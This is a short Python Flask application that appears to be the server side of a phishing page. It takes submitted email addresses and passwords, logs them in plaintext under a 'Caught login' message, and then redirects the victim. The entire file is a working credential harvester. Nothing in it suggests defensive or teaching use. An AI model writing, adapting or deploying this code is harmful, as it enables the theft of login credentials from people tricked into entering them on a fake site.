from flask import Flask, render_template, request
from datetime import datetime

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    print(f"[+] {timestamp} — Caught login -> Email: {email}, Password: {password}")

    return render_template('redirect.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
